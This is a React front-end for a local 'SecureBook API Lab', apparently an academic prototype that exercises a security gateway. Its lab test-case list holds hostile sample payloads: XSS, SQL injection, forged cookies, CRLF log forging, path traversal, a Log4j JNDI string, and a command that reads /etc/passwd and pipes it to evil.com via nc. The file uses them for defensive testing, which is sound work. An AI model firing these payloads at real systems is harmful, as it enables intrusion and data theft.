import React, { useState, useEffect } from 'react';

const GATEWAY_URL = 'http://localhost:8080';

const PRESET_USERS = [
  { username: 'user01', label: 'user01 (Owns Books 101, 102)' },
  { username: 'user02', label: 'user02 (Owns Books 201, 202)' },
  { username: 'user03', label: 'user03 (Owns Books 301, 302)' },
  { username: 'user04', label: 'user04 (Owns Books 401, 402)' },
  { username: 'user05', label: 'user05 (Owns Books 501, 502)' }
];

export default function App() {
  const [activeTab, setActiveTab] = useState('books');
  const [currentUser, setCurrentUser] = useState('user01');
  const [token, setToken] = useState('dummy-token-user01');
  
  const [books, setBooks] = useState([]);
  const [selectedBook, setSelectedBook] = useState(null);
  const [bookComments, setBookComments] = useState([]);
  const [newCommentText, setNewCommentText] = useState('');
  
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedCategory, setSelectedCategory] = useState('All');
  const [loading, setLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState(null);
  
  const [requestHistory, setRequestHistory] = useState([]);
  const [labResults, setLabResults] = useState({});

  // Fetch books through Security Gateway
  const fetchBooks = async (query = '', cat = 'All') => {
    setLoading(true);
    const start = performance.now();
    let url = `${GATEWAY_URL}/api/books`;
    const params = new URLSearchParams();
    if (query) params.append('search', query);
    if (cat && cat !== 'All') params.append('category', cat);
    if (params.toString()) url += `?${params.toString()}`;

    try {
      const resp = await fetch(url, {
        headers: {
          'X-Authenticated-User': currentUser,
          'Authorization': `Bearer ${token}`
        }
      });
      const duration = Math.round(performance.now() - start);
      const reqId = resp.headers.get('X-Request-Id') || 'REQ-LOCAL';
      const dec = resp.headers.get('X-Security-Decision') || (resp.ok ? 'ALLOW' : 'BLOCK');

      const data = await resp.json();
      logHistory('GET', url, resp.status, dec, duration, reqId, resp.ok ? 'Loaded catalog' : data.error);

      if (resp.ok) {
        setBooks(data.books || []);
        setStatusMessage(null);
      } else {
        setStatusMessage({ type: 'error', text: data.error || 'Blocked by Security Gateway' });
      }
    } catch (err) {
      logHistory('GET', url, 0, 'FAIL', Math.round(performance.now() - start), 'ERR', err.message);
      setStatusMessage({ type: 'error', text: 'Gateway unreachable on port 8080. Please ensure gateway is running.' });
    } finally {
      setLoading(false);
    }
  };

  const logHistory = (method, endpoint, status, decision, latency, reqId, note) => {
    const entry = {
      id: Date.now(),
      time: new Date().toLocaleTimeString(),
      method,
      endpoint: endpoint.replace(GATEWAY_URL, ''),
      status,
      decision,
      latency,
      reqId,
      note
    };
    setRequestHistory(prev => [entry, ...prev.slice(0, 49)]);
  };

  useEffect(() => {
    fetchBooks(searchQuery, selectedCategory);
  }, [currentUser, selectedCategory]);

  const handleSearchSubmit = (e) => {
    e.preventDefault();
    let cat = selectedCategory;
    const q = searchQuery.trim().toLowerCase();
    const knownCats = ['science', 'math', 'maths', 'mathematics', 'technology', 'engineering', 'computer science'];
    if (knownCats.includes(q) && selectedCategory !== 'All') {
      cat = 'All';
      setSelectedCategory('All');
    }
    fetchBooks(searchQuery, cat);
  };

  // Open Book Details & Fetch Comments
  const openBookDetails = async (book) => {
    setSelectedBook(book);
    try {
      const resp = await fetch(`${GATEWAY_URL}/api/comments/book/${book.id}`, {
        headers: { 'X-Authenticated-User': currentUser }
      });
      if (resp.ok) {
        const data = await resp.json();
        setBookComments(data.comments || []);
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Add Comment (with Safe XSS Handling)
  const handleAddComment = async (e) => {
    e.preventDefault();
    if (!newCommentText.trim() || !selectedBook) return;

    const start = performance.now();
    const url = `${GATEWAY_URL}/api/comments/book/${selectedBook.id}`;

    try {
      const resp = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Authenticated-User': currentUser,
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ text: newCommentText })
      });
      const duration = Math.round(performance.now() - start);
      const reqId = resp.headers.get('X-Request-Id') || 'REQ-COM';
      const dec = resp.headers.get('X-Security-Decision') || (resp.ok ? 'ALLOW' : 'BLOCK');
      const data = await resp.json();

      logHistory('POST', url, resp.status, dec, duration, reqId, resp.ok ? 'Comment added' : data.error);

      if (resp.ok) {
        setBookComments(prev => [...prev, data.comment]);
        setNewCommentText('');
        setStatusMessage({ type: 'success', text: 'Comment added successfully.' });
      } else {
        setStatusMessage({ type: 'error', text: data.error || 'Blocked by Security Gateway' });
      }
    } catch (err) {
      setStatusMessage({ type: 'error', text: err.message });
    }
  };

  // Attempt Book Modification (Tests BOLA)
  const handleEditBookAttempt = async (bookId) => {
    const start = performance.now();
    const url = `${GATEWAY_URL}/api/books/${bookId}`;
    try {
      const resp = await fetch(url, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Authenticated-User': currentUser,
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ title: 'Modified Title by ' + currentUser })
      });
      const duration = Math.round(performance.now() - start);
      const reqId = resp.headers.get('X-Request-Id') || 'REQ-BOLA';
      const dec = resp.headers.get('X-Security-Decision') || (resp.ok ? 'ALLOW' : 'BLOCK');
      const data = await resp.json();

      logHistory('PUT', url, resp.status, dec, duration, reqId, resp.ok ? 'Updated' : data.error);

      if (resp.ok) {
        setStatusMessage({ type: 'success', text: 'Book updated successfully.' });
        fetchBooks(searchQuery, selectedCategory);
      } else {
        setStatusMessage({
          type: 'error',
          text: `[${resp.status} ${data.code || 'Blocked'}] ${data.error || 'Permission Denied'}`
        });
      }
    } catch (err) {
      setStatusMessage({ type: 'error', text: err.message });
    }
  };

  // Execute Security Lab Simulation Test
  const runSecurityLabTest = async (testId, testConfig) => {
    setLabResults(prev => ({ ...prev, [testId]: { status: 'running' } }));
    const start = performance.now();

    try {
      const fetchOpts = {
        method: testConfig.method,
        headers: {
          'Content-Type': 'application/json',
          'X-Authenticated-User': testConfig.user || currentUser,
          'X-Test-Case-Id': testId,
          ...(testConfig.headers || {})
        }
      };
      if (testConfig.body) {
        fetchOpts.body = typeof testConfig.body === 'string' ? testConfig.body : JSON.stringify(testConfig.body);
      }

      const resp = await fetch(`${GATEWAY_URL}${testConfig.endpoint}`, fetchOpts);
      const duration = Math.round(performance.now() - start);
      const reqId = resp.headers.get('X-Request-Id') || 'REQ-LAB';
      const dec = resp.headers.get('X-Security-Decision') || (resp.ok ? 'ALLOW' : 'BLOCK');
      const mitigation = resp.headers.get('X-Mitigation-Action') || (resp.ok ? 'ALLOW' : 'BLOCK');

      let responseData;
      try {
        responseData = await resp.json();
      } catch {
        responseData = { message: await resp.text() };
      }

      logHistory(testConfig.method, testConfig.endpoint, resp.status, dec, duration, reqId, testConfig.name);

      setLabResults(prev => ({
        ...prev,
        [testId]: {
          status: 'completed',
          httpStatus: resp.status,
          decision: dec,
          mitigation,
          requestId: reqId,
          duration,
          data: responseData
        }
      }));
    } catch (err) {
      setLabResults(prev => ({
        ...prev,
        [testId]: {
          status: 'error',
          error: err.message
        }
      }));
    }
  };

  const LAB_TEST_CASES = [
    {
      id: 'NORMAL_001',
      name: 'Normal Catalog Request',
      method: 'GET',
      endpoint: '/api/books',
      expected: 'ALLOW (200 OK)',
      description: 'Standard legitimate catalog fetch by authenticated user.'
    },
    {
      id: 'BOLA_001',
      name: 'BOLA Cross-Owner Attempt',
      method: 'PUT',
      user: 'user01',
      endpoint: '/api/books/201',
      body: { title: 'Unauthorized Modification' },
      expected: 'BLOCK (403 Forbidden)',
      description: 'user01 attempts to modify book 201 belonging to user02.'
    },
    {
      id: 'XSS_001',
      name: 'Reflected / Stored XSS',
      method: 'POST',
      endpoint: '/api/comments/book/101',
      body: { text: '<script>alert("xss")</script><img src=x onerror=alert(1)>' },
      expected: 'BLOCK / Safe Sanitization (403/Sanitized)',
      description: 'Malicious HTML script injection submitted in comment text.'
    },
    {
      id: 'SQLI_001',
      name: 'SQL Injection Search',
      method: 'GET',
      endpoint: '/api/books?search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*',
      expected: 'BLOCK (403 Forbidden)',
      description: 'Tautological quote-break SQL injection payload in search query parameter.'
    },
    {
      id: 'COOKIE_001',
      name: 'Cookie Injection / Session Hijack',
      method: 'GET',
      endpoint: '/api/books',
      headers: { 'Cookie': 'admin=true; role=superadmin; token=malicious_forge_xyz' },
      expected: 'BLOCK / Reauthenticate (401/403)',
      description: 'Controlled malformed authorization cookie injected into headers.'
    },
    {
      id: 'LOGFORGE_001',
      name: 'Log Forging / CRLF Injection',
      method: 'POST',
      endpoint: '/api/comments/book/101',
      body: { text: "Normal text\\r\\n[2026-10-08 17:00:00] [CRITICAL] Admin granted root privileges" },
      expected: 'BLOCK / Structured Log Enforcement (403)',
      description: 'CRLF newline characters injected to spoof server audit log lines.'
    },
    {
      id: 'RCE_001',
      name: 'Remote Code Execution (RCE)',
      method: 'GET',
      endpoint: '/api/books?search=;%20cat%20/etc/passwd%20|%20nc%20evil.com%204444',
      expected: 'BLOCK (Execution: NOT PERFORMED)',
      description: 'Shell piping and command separator pattern in request query.'
    },
    {
      id: 'TRAVERSAL_001',
      name: 'Directory Traversal',
      method: 'GET',
      endpoint: '/api/books/..%2F..%2F..%2Fetc%2Fpasswd',
      expected: 'BLOCK (403 Forbidden)',
      description: 'Path traversal sequences attempting arbitrary local file discovery.'
    },
    {
      id: 'LOG4J_001',
      name: 'Log4j JNDI Lookup',
      method: 'POST',
      endpoint: '/api/comments/book/101',
      body: { text: '${jndi:ldap://evil-host.com:1389/Exploit}' },
      expected: 'BLOCK (403 Forbidden)',
      description: 'Controlled JNDI lookup string pattern without triggering remote execution.'
    }
  ];

  return (
    <div className="app-container">
      {/* Top Navigation */}
      <header className="navbar">
        <div className="nav-brand" onClick={() => setActiveTab('books')}>
          <div className="brand-icon">SB</div>
          <div>
            <span className="brand-title">SecureBook API Lab</span>
            <span className="brand-subtitle">Academic REST Security Research Prototype</span>
          </div>
        </div>

        <nav className="nav-links">
          <button
            className={`nav-btn ${activeTab === 'books' ? 'active' : ''}`}
            onClick={() => setActiveTab('books')}
          >
            Books Catalog
          </button>
          <button
            className={`nav-btn ${activeTab === 'security-lab' ? 'active' : ''}`}
            onClick={() => setActiveTab('security-lab')}
          >
            Security Lab (Interactive)
          </button>
          <button
            className={`nav-btn ${activeTab === 'history' ? 'active' : ''}`}
            onClick={() => setActiveTab('history')}
          >
            Request History ({requestHistory.length})
          </button>
          <button
            className={`nav-btn ${activeTab === 'profile' ? 'active' : ''}`}
            onClick={() => setActiveTab('profile')}
          >
            Profile
          </button>
          <a
            href="http://localhost:5174"
            target="_blank"
            rel="noreferrer"
            className="nav-btn"
            style={{ color: '#1e40af', fontWeight: '600' }}
          >
            Research Dashboard ↗
          </a>
        </nav>

        <div className="user-badge-container">
          <div className="user-chip">
            <span className="avatar-circle">{currentUser.slice(-2)}</span>
            <select
              value={currentUser}
              onChange={(e) => setCurrentUser(e.target.value)}
              style={{ border: 'none', background: 'transparent', fontWeight: 600, outline: 'none' }}
            >
              {PRESET_USERS.map(u => (
                <option key={u.username} value={u.username}>{u.label}</option>
              ))}
            </select>
          </div>
        </div>
      </header>

      {/* Main View Area */}
      <main className="main-content">
        {statusMessage && (
          <div style={{
            padding: '0.75rem 1rem',
            marginBottom: '1.25rem',
            borderRadius: '6px',
            backgroundColor: statusMessage.type === 'error' ? '#fef2f2' : '#ecfdf5',
            border: `1px solid ${statusMessage.type === 'error' ? '#fecaca' : '#a7f3d0'}`,
            color: statusMessage.type === 'error' ? '#991b1b' : '#065f46',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center'
          }}>
            <span><strong>{statusMessage.type === 'error' ? 'Security Notice:' : 'Notice:'}</strong> {statusMessage.text}</span>
            <button
              onClick={() => setStatusMessage(null)}
              style={{ background: 'none', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}
            >
              ✕
            </button>
          </div>
        )}

        {/* 1. BOOKS CATALOG VIEW */}
        {activeTab === 'books' && (
          <div>
            <div className="card-header" style={{ borderBottom: 'none', paddingBottom: 0 }}>
              <div>
                <h1 className="card-title" style={{ fontSize: '1.5rem' }}>Book Management Platform</h1>
                <p style={{ color: 'var(--text-muted)', fontSize: '0.875rem' }}>
                  All catalog operations are actively inspected by the Security Gateway on Port 8080.
                </p>
              </div>
            </div>

            {/* Filter & Search Bar */}
            <div className="card" style={{ marginTop: '1rem', padding: '1rem' }}>
              <form onSubmit={handleSearchSubmit} style={{ display: 'flex', gap: '0.75rem', alignItems: 'center' }}>
                <input
                  type="text"
                  placeholder="Search books by title, author, or keyword..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="form-input"
                  style={{ flex: 1 }}
                />
                <select
                  value={selectedCategory}
                  onChange={(e) => setSelectedCategory(e.target.value)}
                  className="form-select"
                  style={{ width: '180px' }}
                >
                  <option value="All">All Categories</option>
                  <option value="Technology">Technology</option>
                  <option value="Science">Science</option>
                  <option value="Engineering">Engineering</option>
                  <option value="Mathematics">Mathematics</option>
                  <option value="Computer Science">Computer Science</option>
                </select>
                <button type="submit" className="btn btn-primary">Search</button>
                <button
                  type="button"
                  className="btn btn-outline"
                  onClick={() => { setSearchQuery(''); setSelectedCategory('All'); fetchBooks('', 'All'); }}
                >
                  Reset
                </button>
              </form>
            </div>

            {/* Book Cards Grid */}
            {loading ? (
              <p style={{ marginTop: '2rem', textAlign: 'center', color: 'var(--text-muted)' }}>Loading catalog through Security Gateway...</p>
            ) : (
              <div className="book-grid">
                {books.map(b => (
                  <div key={b.id} className="book-card">
                    <div>
                      <span className={`book-badge badge-${b.category ? b.category.toLowerCase().slice(0, 4) : 'general'}`}>
                        {b.category}
                      </span>
                      <h3 style={{ fontSize: '1.05rem', fontWeight: 600, color: 'var(--text-main)', marginBottom: '0.25rem' }}>
                        {b.title}
                      </h3>
                      <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', marginBottom: '0.5rem' }}>
                        by {b.author}
                      </p>
                      <p style={{ fontSize: '0.8rem', color: '#475569', lineHeight: 1.4 }}>
                        {b.description ? b.description.slice(0, 110) + '...' : ''}
                      </p>
                    </div>

                    <div style={{ marginTop: '1rem', paddingTop: '0.75rem', borderTop: '1px solid var(--border-light)' }}>
                      <div className="owner-tag">
                        <span>Owner: <strong>{b.owner}</strong></span>
                        <span style={{ marginLeft: 'auto' }}>★ {b.rating}</span>
                      </div>

                      <div style={{ display: 'flex', gap: '0.4rem', marginTop: '0.75rem' }}>
                        <button
                          className="btn btn-outline btn-sm"
                          style={{ flex: 1 }}
                          onClick={() => openBookDetails(b)}
                        >
                          View Details
                        </button>
                        <button
                          className="btn btn-outline btn-sm"
                          title={b.owner === currentUser ? 'Edit your book' : 'Attempt cross-owner edit (BOLA Test)'}
                          onClick={() => handleEditBookAttempt(b.id)}
                        >
                          {b.owner === currentUser ? 'Edit' : 'Edit (BOLA)'}
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* 2. SECURITY LAB (INTERACTIVE DEMO SUITE) */}
        {activeTab === 'security-lab' && (
          <div>
            <div className="lab-header">
              <h2 style={{ fontSize: '1.25rem', fontWeight: 600, marginBottom: '0.25rem' }}>
                Security Demonstration Lab
              </h2>
              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>
                Manually trigger controlled benign and adversarial HTTP requests to observe the live gateway interception,
                model classification, and visible system mitigation.
              </p>
            </div>

            <div className="lab-grid">
              {LAB_TEST_CASES.map(tc => {
                const res = labResults[tc.id];
                return (
                  <div key={tc.id} className="lab-card">
                    <div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                        <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--primary)' }}>{tc.id}</span>
                        <span style={{ fontSize: '0.75rem', background: '#f1f5f9', padding: '0.1rem 0.4rem', borderRadius: '4px' }}>
                          {tc.method}
                        </span>
                      </div>
                      <h4 style={{ fontSize: '0.95rem', fontWeight: 600, marginBottom: '0.25rem' }}>{tc.name}</h4>
                      <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '0.5rem' }}>
                        {tc.description}
                      </p>
                      <div style={{ fontSize: '0.75rem', color: '#64748b', background: '#f8fafc', padding: '0.4rem', borderRadius: '4px', marginBottom: '0.5rem' }}>
                        <code>{tc.endpoint}</code>
                      </div>
                      <div style={{ fontSize: '0.75rem', color: '#475569' }}>
                        Expected: <strong>{tc.expected}</strong>
                      </div>
                    </div>

                    <div style={{ marginTop: '1rem' }}>
                      <button
                        className="btn btn-primary btn-sm"
                        style={{ width: '100%' }}
                        disabled={res && res.status === 'running'}
                        onClick={() => runSecurityLabTest(tc.id, tc)}
                      >
                        {res && res.status === 'running' ? 'Running Request...' : 'Run Test'}
                      </button>

                      {res && res.status === 'completed' && (
                        <div className="lab-result-box">
                          <div><strong>Status:</strong> HTTP {res.httpStatus}</div>
                          <div><strong>Decision:</strong> <span className={`status-pill ${res.decision.toLowerCase()}`}>{res.decision}</span></div>
                          <div><strong>Mitigation:</strong> {res.mitigation}</div>
                          <div><strong>Req ID:</strong> {res.requestId}</div>
                          <div><strong>Latency:</strong> {res.duration} ms</div>
                          {res.data && res.data.error && (
                            <div style={{ color: '#dc2626', marginTop: '0.25rem' }}>
                              <strong>Message:</strong> {res.data.error}
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* 3. REQUEST HISTORY VIEW */}
        {activeTab === 'history' && (
          <div className="card">
            <div className="card-header">
              <h2 className="card-title">Client HTTP Request History</h2>
              <button className="btn btn-outline btn-sm" onClick={() => setRequestHistory([])}>Clear Log</button>
            </div>
            <div className="table-container">
              <table>
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Request ID</th>
                    <th>Method</th>
                    <th>Endpoint</th>
                    <th>Status</th>
                    <th>Gateway Decision</th>
                    <th>Latency</th>
                    <th>Result Summary</th>
                  </tr>
                </thead>
                <tbody>
                  {requestHistory.length === 0 ? (
                    <tr>
                      <td colSpan="8" style={{ textAlign: 'center', color: 'var(--text-muted)', padding: '2rem' }}>
                        No requests logged yet. Perform actions or run tests in the Security Lab.
                      </td>
                    </tr>
                  ) : (
                    requestHistory.map(r => (
                      <tr key={r.id}>
                        <td>{r.time}</td>
                        <td><code>{r.reqId}</code></td>
                        <td><strong>{r.method}</strong></td>
                        <td><code style={{ fontSize: '0.8rem' }}>{r.endpoint}</code></td>
                        <td>{r.status}</td>
                        <td>
                          <span className={`status-pill ${r.decision.toLowerCase()}`}>
                            {r.decision}
                          </span>
                        </td>
                        <td>{r.latency} ms</td>
                        <td>{r.note}</td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* 4. USER PROFILE VIEW */}
        {activeTab === 'profile' && (
          <div className="card" style={{ maxWidth: '650px', margin: '0 auto' }}>
            <div className="card-header">
              <h2 className="card-title">Active User Profile</h2>
            </div>
            <div style={{ display: 'flex', gap: '1.5rem', alignItems: 'center', marginBottom: '1.5rem' }}>
              <div style={{
                width: '64px',
                height: '64px',
                borderRadius: '50%',
                background: '#1e40af',
                color: '#fff',
                fontSize: '1.5rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontWeight: 700
              }}>
                {currentUser.slice(-2)}
              </div>
              <div>
                <h3 style={{ fontSize: '1.25rem', fontWeight: 600 }}>{currentUser}</h3>
                <p style={{ color: 'var(--text-muted)', fontSize: '0.85rem' }}>{currentUser}@securebook.lab</p>
                <span className="status-pill allow" style={{ marginTop: '0.25rem' }}>Role: Verified Researcher</span>
              </div>
            </div>

            <div style={{ background: 'var(--bg-subtle)', padding: '1rem', borderRadius: '8px', fontSize: '0.85rem' }}>
              <h4 style={{ fontWeight: 600, marginBottom: '0.5rem' }}>Deterministic Assigned Resources:</h4>
              <p>• <strong>Owned Books:</strong> {books.filter(b => b.owner === currentUser).map(b => `#${b.id} (${b.title})`).join(', ') || 'None'}</p>
              <p style={{ marginTop: '0.5rem' }}>• <strong>JWT Session Token:</strong> <code>{token}</code></p>
              <p style={{ marginTop: '0.5rem' }}>• <strong>BOLA Enforcement Note:</strong> Attempting to edit or delete objects not in your assigned set will trigger 403 Forbidden at the backend authorization layer.</p>
            </div>
          </div>
        )}

        {/* BOOK DETAILS & COMMENTS MODAL */}
        {selectedBook && (
          <div className="modal-overlay" onClick={() => setSelectedBook(null)}>
            <div className="modal-content" onClick={e => e.stopPropagation()}>
              <div className="card-header">
                <div>
                  <span className="book-badge badge-tech">{selectedBook.category}</span>
                  <h2 className="card-title" style={{ marginTop: '0.25rem' }}>{selectedBook.title}</h2>
                  <p style={{ color: 'var(--text-muted)', fontSize: '0.85rem' }}>by {selectedBook.author} (Owner: {selectedBook.owner})</p>
                </div>
                <button
                  onClick={() => setSelectedBook(null)}
                  style={{ background: 'none', border: 'none', fontSize: '1.25rem', cursor: 'pointer' }}
                >
                  ✕
                </button>
              </div>

              <div style={{ marginBottom: '1.5rem', fontSize: '0.9rem', color: '#334155', lineHeight: 1.6 }}>
                <p>{selectedBook.description}</p>
              </div>

              {/* Comments Section */}
              <div style={{ borderTop: '1px solid var(--border-light)', paddingTop: '1rem' }}>
                <h3 style={{ fontSize: '1rem', fontWeight: 600, marginBottom: '0.75rem' }}>
                  Reader Comments ({bookComments.length})
                </h3>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1rem' }}>
                  {bookComments.length === 0 ? (
                    <p style={{ color: 'var(--text-dim)', fontSize: '0.85rem' }}>No comments yet.</p>
                  ) : (
                    bookComments.map(c => (
                      <div key={c.id} style={{ background: '#f8fafc', padding: '0.65rem', borderRadius: '6px', border: '1px solid var(--border-light)' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '0.25rem' }}>
                          <strong>{c.user}</strong>
                          <span>{new Date(c.timestamp).toLocaleTimeString()}</span>
                        </div>
                        {/* Safe rendering */}
                        <p style={{ fontSize: '0.85rem', color: '#1e293b' }}>{c.text}</p>
                      </div>
                    ))
                  )}
                </div>

                <form onSubmit={handleAddComment}>
                  <div className="form-group">
                    <textarea
                      rows="2"
                      placeholder="Add a safe comment (or test XSS payload)..."
                      value={newCommentText}
                      onChange={e => setNewCommentText(e.target.value)}
                      className="form-textarea"
                    />
                  </div>
                  <button type="submit" className="btn btn-primary btn-sm">Submit Comment</button>
                </form>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
